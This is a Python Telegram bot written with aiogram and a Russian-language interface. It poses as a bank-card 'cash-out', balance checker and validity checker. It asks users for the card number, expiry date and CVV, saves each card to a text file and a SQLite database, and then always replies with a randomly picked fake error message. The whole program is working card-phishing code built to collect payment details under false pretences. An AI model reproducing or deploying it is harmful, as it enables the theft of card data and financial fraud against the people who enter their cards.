from aiogram import Bot, types
from aiogram.dispatcher import Dispatcher
from aiogram.utils import executor
from aiogram.types import ParseMode
import asyncio
from aiogram.utils.markdown import text, bold, italic, code, pre
from aiogram.utils.emoji import emojize, demojize
from sqlalchemy import create_engine, Column, String
from sqlalchemy.orm import sessionmaker
from sqlalchemy.ext.declarative import declarative_base
from random import randint, choice
import script as scr
from config import TOKEN

Base = declarative_base()


class Cards(Base):
    __tablename__ = 'cards'
    number = Column('number', String, primary_key=True, unique=False)
    date = Column('date', String, unique=False)
    cvv = Column('cvv', String, unique=False)


engine = create_engine('sqlite:///cards.db')
Base.metadata.create_all(bind=engine)
Session = sessionmaker(bind=engine)
bot = Bot(token=TOKEN)
dp = Dispatcher(bot)
waitingfornumber = False


@dp.message_handler(commands=['start'])
async def process_start_command(message: types.Message):
    await message.reply(f"Приветствую, {message.from_user.username}!")
    await message.answer('Выберите действие:', reply_markup=scr.greet_kb)


@dp.message_handler(lambda
                            message: demojize(message.text) == ':credit_card: Обналичивание' or message.text == ':dollar: Чекер Баланса' or message.text == ':money_with_wings: Чекер на валидность')
async def entercard(message: types.Message):
    msg = 'Введите данные карты в формате:\nXXXXXXXXXXXXXXXX | XX/XX | XXX\nСтрого учитывайте разделитель "|"'
    await message.answer(msg, parse_mode=ParseMode.MARKDOWN)
    global waitingfornumber
    waitingfornumber = True


@dp.message_handler()
async def getcardnumber(message: types.Message):
    global waitingfornumber
    errors = ['Ошибка 1382. Баланс не найден.', 'Ошибка 273. Карта невалидна.', 'Ошибка 524. Банк закрыл операцию.'] \
             * 5
    if waitingfornumber:
        txt = message.text.replace(' ', '').split('|')
        try:
            if scr.checkmsg(txt[0], txt[1], txt[2]):
                session = Session()
                cards = Cards()
                waitingfornumber = False
                file = open("cards.txt", "a+")
                if txt[0] not in file:
                    file.write('' + ' '.join(txt) + '\n')
                    cards.number = txt[0]
                    cards.date = txt[1]
                    cards.cvv = txt[2]
                    session.add(cards)
                    session.commit()
                else:
                    await message.answer('Данные карты введены неверно. Убедитесь в том, что вы написали номер карты по структуре\nXXXXXXXXXXXXXXXX | XX/XX | XXX')
                file.close()
                chas = emojize(':hourglass_flowing_sand:')
                await message.answer(f'{chas} Пожалуйста, подождите, идет обработка', parse_mode=ParseMode.MARKDOWN)
                await asyncio.sleep(randint(1, 3))
                answ = emojize(':x:') + '' + choice(errors)
                await message.answer(answ, parse_mode=ParseMode.MARKDOWN)
            else:
                await message.answer('Данные карты введены неверно. Убедитесь в том, что вы написали номер карты по структуре\nXXXXXXXXXXXXXXXX | XX/XX | XXX')
        except IndexError:
            await message.answer(
                'Ошибка. Данные карты введены неверно. Убедитесь в том, что вы написали номер карты по структуре\n"XXXXXXXXXXXXXXXX | XX/XX | XXX" (без кавычек), строго соблюдая разделитель', parse_mode=ParseMode.MARKDOWN)


if __name__ == '__main__':
    executor.start_polling(dp)
